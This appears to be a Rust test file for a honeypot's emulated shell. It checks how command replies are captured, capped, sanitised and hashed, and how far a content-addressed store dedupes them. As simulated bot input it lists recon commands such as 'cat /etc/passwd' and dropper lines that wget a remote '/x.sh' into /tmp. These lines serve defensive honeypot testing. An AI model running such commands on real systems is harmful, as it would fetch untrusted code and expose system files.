//! `SensorEvent::reply`: the command event carries what the shell printed, capped and sanitized,
//! and nothing else does.

use sensor_wire::REPLY_TEXT_CAP;

use crate::fakefs::FakeFs;
use crate::shell::{EmitContext, FakeShell, LineStep, reply_ref};

fn exec_shell() -> FakeShell {
    FakeShell::exec(
        FakeFs::new(),
        EmitContext {
            source_ip: "203.0.113.7".parse().unwrap(),
            wan_ip: None,
            authenticated: true,
            protocol_label: "ssh".to_string(),
            session_id: None,
        },
    )
}

/// SHA-256 of the ASCII string "hello", from the FIPS 180-4 test vector set, written out so the
/// digest is not checked with the code that computes it.
const HELLO_SHA256: &str = "2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824";

#[test]
fn the_command_event_carries_what_the_shell_printed() {
    let (result, events) = exec_shell().handle_input("echo hello");
    let reply = events[0]
        .reply
        .as_ref()
        .expect("a printing command has a reply");
    assert_eq!(reply.text, "hello");
    assert_eq!(
        reply.len, 6,
        "the length is of the bytes printed, newline included"
    );
    assert!(!reply.truncated);
    assert_eq!(reply.sha256, HELLO_SHA256);
    assert_eq!(
        result.bytes(),
        b"hello\n",
        "the bot still reads the full output"
    );
}

#[test]
fn a_command_that_prints_nothing_has_no_reply() {
    let (_, events) = exec_shell().handle_input("true");
    assert!(events[0].reply.is_none());
}

#[test]
fn only_the_command_event_carries_a_reply() {
    let (_, events) = exec_shell().handle_input("wget http://198.51.100.9/x");
    assert!(events.len() > 1, "the line produced a download event too");
    assert!(events[1..].iter().all(|e| e.reply.is_none()));
}

#[test]
fn a_line_left_waiting_for_input_has_no_reply_yet() {
    let (step, events) = exec_shell().start_line("cat");
    assert!(matches!(step, LineStep::AwaitingInput));
    assert!(events[0].reply.is_none());
}

#[test]
fn equal_output_has_one_digest_whatever_ran() {
    let a = exec_shell().handle_input("echo hello").1[0]
        .reply
        .clone()
        .unwrap();
    let b = exec_shell().handle_input("printf 'hello\\n'").1[0]
        .reply
        .clone()
        .unwrap();
    assert_eq!(a.sha256, b.sha256);
}

#[test]
fn the_cap_is_exact_and_the_flag_says_whether_anything_was_cut() {
    let exact = reply_ref(&vec![b'a'; REPLY_TEXT_CAP]).unwrap();
    assert_eq!(exact.text.len(), REPLY_TEXT_CAP);
    assert!(!exact.truncated, "output of exactly the cap lost nothing");

    let over = reply_ref(&vec![b'a'; REPLY_TEXT_CAP + 1]).unwrap();
    assert_eq!(over.text.len(), REPLY_TEXT_CAP);
    assert!(over.truncated);
    assert_eq!(
        over.len,
        REPLY_TEXT_CAP as u64 + 1,
        "len is the full output, not the kept text"
    );
}

#[test]
fn a_cut_inside_a_long_line_is_flagged_and_stays_within_the_cap() {
    let mut bytes = b"first\n".to_vec();
    bytes.extend(vec![b'b'; REPLY_TEXT_CAP]);
    let r = reply_ref(&bytes).unwrap();
    assert!(r.truncated);
    assert!(r.text.len() <= REPLY_TEXT_CAP);
    assert!(r.text.starts_with("first\nbbb"));
}

#[test]
fn text_that_grows_when_decoded_is_cut_and_flagged_though_the_output_fit_the_window() {
    // 2000 invalid bytes decode to 2000 three-byte replacement characters: 6000 bytes of text from
    // output shorter than the cap.
    let r = reply_ref(&vec![0xff; 2000]).unwrap();
    assert!(
        r.truncated,
        "the text was cut, whatever the output's own length"
    );
    assert!(r.text.len() <= REPLY_TEXT_CAP);
    assert_eq!(r.len, 2000);
}

#[test]
fn control_characters_and_nul_do_not_survive_but_line_breaks_do() {
    let r = reply_ref(b"a\x1b[31mred\x00z\r\nb\rc\n\n").unwrap();
    assert!(!r.text.contains('\x1b') && !r.text.contains('\0') && !r.text.contains('\r'));
    assert_eq!(r.text.lines().collect::<Vec<_>>(), ["aredz", "b", "c"]);
    assert!(
        !r.text.ends_with('\n'),
        "trailing line breaks are not part of the reply"
    );
}

#[test]
fn invalid_utf8_is_decoded_lossily_not_refused() {
    let r = reply_ref(b"ok \xff\xfe end").unwrap();
    assert!(r.text.starts_with("ok "));
    assert!(r.text.ends_with(" end"));
}

#[test]
fn output_of_only_line_breaks_has_no_reply() {
    assert!(reply_ref(b"\n\r\n").is_none());
    assert!(reply_ref(b"").is_none());
}

/// How much the content-addressed store saves on a synthetic mix of bot sessions: fixed recon
/// commands, the same dropper stage with a varying address, and per-session random tokens (the
/// worst case for sharing). Prints the measured figures (`--nocapture`) and holds the floor the
/// design relies on: a reply is stored once however many sessions got it.
#[test]
fn dedupe_ratio_on_a_synthetic_session_mix() {
    use std::collections::HashMap;

    let recon = [
        "uname -a",
        "uname -m",
        "whoami",
        "id",
        "cat /proc/cpuinfo | grep name | wc -l",
        "free -m",
        "ls -la /tmp",
        "cat /etc/passwd",
        "ps aux | head -5",
        "echo -e '\\x6b\\x61\\x6d\\x69'",
        "nproc",
        "cat /etc/os-release",
    ];
    let mut state = 0x2545_f491_4f6c_dd1du64;
    let mut next = |n: usize| {
        state ^= state << 13;
        state ^= state >> 7;
        state ^= state << 17;
        (state % n as u64) as usize
    };

    let mut events_with_reply = 0usize;
    let mut raw_bytes = 0usize;
    let mut stored: HashMap<String, usize> = HashMap::new();
    let mut commands = 0usize;
    let mut recon_events = 0usize;
    let mut recon_distinct = std::collections::HashSet::new();
    // 1000 sessions measured 3.9 replies per stored row (25 s); 150 keep the suite quick.
    for session in 0..150 {
        let mut shell = exec_shell();
        let mut lines: Vec<String> = Vec::new();
        for _ in 0..(3 + next(6)) {
            lines.push(recon[next(recon.len())].to_string());
        }
        let recon_lines = lines.len();
        // A dropper stage whose address differs per source, and a token that differs per session.
        lines.push(format!(
            "cd /tmp; wget http://198.51.100.{}/x.sh",
            1 + next(250)
        ));
        lines.push(format!(
            "echo tok{session}x{} > /tmp/.k; cat /tmp/.k",
            next(1_000_000)
        ));
        for (i, line) in lines.into_iter().enumerate() {
            commands += 1;
            let (_, events) = shell.handle_input(line);
            if let Some(reply) = events.first().and_then(|e| e.reply.as_ref()) {
                if i < recon_lines {
                    recon_events += 1;
                    recon_distinct.insert(reply.sha256.clone());
                }
                events_with_reply += 1;
                raw_bytes += reply.text.len();
                stored
                    .entry(reply.sha256.clone())
                    .or_insert(reply.text.len());
            }
        }
    }
    let stored_bytes: usize = stored.values().sum();
    eprintln!(
        "reply dedupe: {commands} commands, {events_with_reply} with a reply, {} distinct \
         (rows {:.1}:1), {raw_bytes} B of reply text vs {stored_bytes} B stored ({:.1}:1)",
        stored.len(),
        events_with_reply as f64 / stored.len() as f64,
        raw_bytes as f64 / stored_bytes as f64,
    );
    eprintln!(
        "reply dedupe, recon commands alone: {recon_events} replies, {} distinct ({:.1}:1)",
        recon_distinct.len(),
        recon_events as f64 / recon_distinct.len() as f64,
    );
    assert!(events_with_reply > 0 && stored.len() < events_with_reply);
}
